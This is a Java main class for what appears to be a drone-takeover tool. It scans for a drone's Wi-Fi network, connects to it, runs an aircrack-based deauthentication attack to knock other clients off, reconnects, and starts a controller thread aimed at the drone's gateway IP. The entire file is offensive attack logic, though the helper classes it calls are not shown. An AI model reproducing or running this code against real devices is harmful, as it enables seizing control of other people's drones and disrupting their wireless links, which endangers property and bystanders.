package main.java;

import drone.DroneController;
import main.java.bot.Email;
import networking.AirocrackSuite;
import networking.Networking;
import networking.WlanNameFinder;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.HashSet;
import java.util.Set;

public class Main {

    public static void main(String[] args) throws InterruptedException, UnknownHostException {


        //Thread.sleep(10000);

        String ifName_managed = args[0];
        String ifName_monitor = args[1];

        System.out.println("Starting search for drones");
        Set<String> essids = new HashSet<>();
        do {
            try {
                essids = WlanNameFinder.getNames();
            } catch (IOException e) {
            }
            Thread.sleep(1000);
        } while (essids.size() == 0);

        String essid = essids.iterator().next();
        System.out.println("Drone found at [" + essid + "]");

        //Email.SendMailSSL("Drone ALERT", "Found drone with essid: " + essid + " in close proximity!");

        /*connect to wifi*/
        System.out.println("Conneceting to [" + essid + "]");
        if (!Networking.connectWIFI(essid, ifName_managed)) {
            System.err.println("Failed to connect!");
            System.err.println("Aborting ... ");
            System.exit(-1);
        }

        System.out.println("Starting DEAUTH");
        AirocrackSuite.deauth(essid, 10, ifName_monitor);
        Thread.sleep(3000);

        System.out.println("Reconnecting to AP");
        if (!Networking.connectWIFI(essid, ifName_managed)) {
            System.err.println("Failed to connect!");
            System.err.println("Aborting ... ");
            System.exit(-1);
            return;
        }


        String ap = Networking.getGatewayIp();
        System.out.println("Found access point ip: " + ap);

        Thread t = new DroneController(InetAddress.getByName(ap));
        t.start();

    }
}
